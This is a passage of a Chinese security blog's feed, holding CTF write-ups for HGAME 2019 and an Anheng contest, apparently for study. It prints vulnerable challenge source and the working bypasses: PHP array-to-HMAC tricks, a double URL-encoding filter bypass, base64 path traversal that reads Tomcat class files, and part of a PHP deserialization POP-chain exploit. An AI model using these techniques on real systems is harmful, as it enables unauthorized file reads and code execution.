hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="PHP-Is-The-Best-Language"><a href="#PHP-Is-The-Best-Language" class="headerlink" title="PHP Is The Best Language"></a>PHP Is The Best Language</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'secret.php'</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">#echo $flag; </span></span><br><span class="line"><span class="comment">#echo $secret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_POST[<span class="string">'gate'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'key'</span>])) &#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'door'</span>]))&#123; </span><br><span class="line">    $secret = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'door'</span>], $secret); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$gate = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'key'</span>], $secret); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($gate !== $_POST[<span class="string">'gate'</span>]) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((md5($_POST[<span class="string">'key'</span>])+<span class="number">1</span>) == (md5(md5($_POST[<span class="string">'key'</span>])))+<span class="number">1</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Wow!!!"</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>; </span><br><span class="line">    <span class="keyword">echo</span> $flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Hacker GetOut!!"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看下题目的意思，是让我们输入<code>$_POST[&#39;door&#39;]</code>和<code>$_POST[&#39;key&#39;]</code>，并预测<code>$gate</code>,同时需要满足<code>(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1</code><br>我们知道sha256遇到数组会产生Warning<br><img src="/images/2019-02-10-21-21-33.png" alt=""><br>看到返回值为null，所以我们输入<code>door[]=1</code><br>可以得到<code>$secret=NULL</code><br>至此，如果我们有key就可以预测gate<br><img src="/images/2019-02-10-21-21-51.png" alt=""><br>那么只要找到满足条件的key即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(md5($_POST[&apos;key&apos;])+1) == (md5(md5($_POST[&apos;key&apos;])))+1</span><br></pre></td></tr></table></figure></p><p>爆破得到key=12<br>计算出gate<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-10-20-55-12.png" alt=""><br>即可得到<code>hgame{Php_MayBe_Not_Safe}</code></p><h2 id="Baby-Spider"><a href="#Baby-Spider" class="headerlink" title="Baby_Spider"></a>Baby_Spider</h2><p>随便尝试了下，发现是让我们自己编写爬虫，以做到快速计算<br><img src="/images/2019-02-10-20-59-03.png" alt=""><br>这里觉得没啥意思，懒得自己写代码了……<br>想看代码的参考学弟的blog<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://altman.vip/2019/02/04/hgame-week2-web/#Baby-Spider</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-02-10-21-15-43.png" alt=""><br>记得改token<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3f78e46ebf1dfa9e4a93f044d7e95989ebdbacb28ce6ed3057af1d5ef2a65810&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Math有趣"><a href="#Math有趣" class="headerlink" title="Math有趣"></a>Math有趣</h2><p>f12查看到图片地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;</span><br></pre></td></tr></table></figure></p><p>对<code>cXVlc3Rpb24ucG5n</code>解base64得到<code>question.png</code><br>随手输入，容易得到报错页面<br><img src="/images/2019-02-10-21-08-14.png" alt=""><br>尝试读文件<br><img src="/images/2019-02-10-21-21-09.png" alt=""><br>根据题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint: 了解一下tomcat、spring mvc的目录结构和配置文件(自己搭一下就明白了</span><br></pre></td></tr></table></figure></p><p>读取路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</span><br></pre></td></tr></table></figure></p><p>下载下来后反编译下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hgame.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Decoder;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.ModelMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(ModelMap model, HttpSession session, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (step.toString().equals(<span class="string">"1"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"Welcome to the world of mathematics.&lt;br/&gt;Let's warm up first.&lt;br/&gt;1+1=?"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (step.toString().equals(<span class="string">"2"</span>)) &#123;</span><br><span class="line">      model.addAttribute(<span class="string">"message"</span>, <span class="string">"It seems that you have learned it, let us do a difficult question.&lt;br/&gt;&lt;img src=/img/cXVlc3Rpb24ucG5n.php&gt;&lt;br/&gt;Show me the smallest integer solutions."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"math"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/index"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pindex</span><span class="params">(@RequestParam(<span class="string">"answer"</span>)</span> String answer, HttpSession session, HttpServletResponse response)</span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object step = session.getAttribute(<span class="string">"step"</span>);</span><br><span class="line">    <span class="keyword">if</span> (step == <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, Character.valueOf(<span class="string">'1'</span>));</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((step.toString().equals(<span class="string">"1"</span>)) &amp;&amp; </span><br><span class="line">      (answer.equals(<span class="string">"2"</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">      session.setAttribute(<span class="string">"step"</span>, <span class="string">"2"</span>);</span><br><span class="line">      response.sendRedirect(<span class="string">"/index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/img/&#123;path&#125;"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">image</span><span class="params">(@PathVariable(<span class="string">"path"</span>)</span> String path, HttpServletResponse response)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    path = <span class="keyword">new</span> String(Base64.getDecoder().decode(path));</span><br><span class="line">    InputStream f = <span class="keyword">null</span>;</span><br><span class="line">    OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f = <span class="keyword">new</span> FileInputStream(<span class="string">"/home/static/"</span> + path);</span><br><span class="line">      out = response.getOutputStream();</span><br><span class="line">      <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="string">'���'</span>];</span><br><span class="line">      <span class="keyword">while</span> ((count = f.read(buffer)) != -<span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        out.write(buffer, <span class="number">0</span>, count);</span><br><span class="line">        out.flush();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      f.close();</span><br><span class="line">      out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>得到题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123852^x % 612799081 = 6181254136845 % 612799081</span><br></pre></td></tr></table></figure></p><p>即</p><script type="math/tex; mode=display">123852^x = 6181254136845 \space mod \space 612799081</script><p>直接爆破得到x=15387368<br>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;15387368&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easy-php&quot;&gt;&lt;a href=&quot;#easy-php&quot; class=&quot;headerlink&quot; title=&quot;easy_php&quot;&gt;&lt;/a&gt;easy_php&lt;/h2&gt;&lt;p&gt;发现信息&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019-Hgame-Web-Week1</title>
    <link href="http://skysec.top/2019/01/25/2019-Hgame-Web-Week1/"/>
    <id>http://skysec.top/2019/01/25/2019-Hgame-Web-Week1/</id>
    <published>2019-01-25T12:05:18.000Z</published>
    <updated>2019-01-25T12:18:15.403Z</updated>
    
    <content type="html"><![CDATA[<h2 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h2><p>按照题目描述<br><img src="/images/2019-01-25-20-06-28.png" alt=""><br>以及题目信息<br><img src="/images/2019-01-25-20-06-42.png" alt=""><br>容易想到是<code>.index.html.swp</code><br>下载后得到flag<br><img src="/images/2019-01-25-20-07-01.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></figure></p><h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><p><img src="/images/2019-01-25-20-11-47.png" alt=""><br>按照要求改http header即可得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></figure></p><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><p>拿到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="string">"vidar"</span>,$_GET[<span class="string">'id'</span>])!==<span class="keyword">FALSE</span>)</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"&lt;p&gt;干巴爹&lt;/p&gt;"</span>);</span><br><span class="line"></span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'id'</span>] === <span class="string">"vidar"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>明显可以2次编码绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576idar</span><br></pre></td></tr></table></figure></p><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></figure></p><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p><img src="/images/2019-01-25-20-16-41.png" alt=""><br><img src="/images/2019-01-25-20-16-16.png" alt=""><br><img src="/images/2019-01-25-20-16-23.png" alt=""><br><img src="/images/2019-01-25-20-17-15.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;谁吃了我的flag&quot;&gt;&lt;a href=&quot;#谁吃了我的flag&quot; class=&quot;headerlink&quot; title=&quot;谁吃了我的flag&quot;&gt;&lt;/a&gt;谁吃了我的flag&lt;/h2&gt;&lt;p&gt;按照题目描述&lt;br&gt;&lt;img src=&quot;/images/2019-01-25-20-
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019安恒1月月赛Writeip</title>
    <link href="http://skysec.top/2019/01/25/2019%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9BWriteip/"/>
    <id>http://skysec.top/2019/01/25/2019安恒1月月赛Writeip/</id>
    <published>2019-01-25T06:54:35.000Z</published>
    <updated>2019-01-27T13:46:22.148Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/170341</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babygo"><a href="#babygo" class="headerlink" title="babygo"></a>babygo</h3><p>拿到题目<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cool</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;     </span><br><span class="line">    <span class="keyword">public</span> $nice;</span><br><span class="line">    <span class="keyword">public</span> $amzing; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">    <span class="keyword">$this</span>-&gt;nice = unserialize(<span class="keyword">$this</span>-&gt;amzing);</span><br><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb)</span><br><span class="line">    &#123;</span><br><span class="line">        $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">        <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">        &#123;              </span><br><span class="line">            <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="string">"./index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现是一个简单的反序列化题目<br>我们发现只要满足<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;nice-&gt;aaa === <span class="keyword">$this</span>-&gt;nice-&gt;bbb</span><br></pre></td></tr></table></figure></p><p>即可读文件<br><img src="/images/2019-01-25-19-58-25.gif" alt=""><br>那么我们利用pop链，构造<br><img src="/images/2019-01-25-19-58-33.gif" alt=""><br>但是我们注意到<br><img src="/images/2019-01-25-19-58-42.gif" alt=""><br>aaa会被重新赋值，所以使用指针，这样bbb会跟随aaa动态改变<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa</span><br></pre></td></tr></table></figure></p><p>构造出如下序列化<br><img src="/images/2019-01-25-19-58-49.gif" alt=""><br>最后得到完整exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">baby</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;    </span><br><span class="line">    <span class="keyword">public</span> $aaa;</span><br><span class="line">    <span class="keyword">public</span> $bbb;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> cool;   </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">        &#123;</span><br><span class="line">            <span 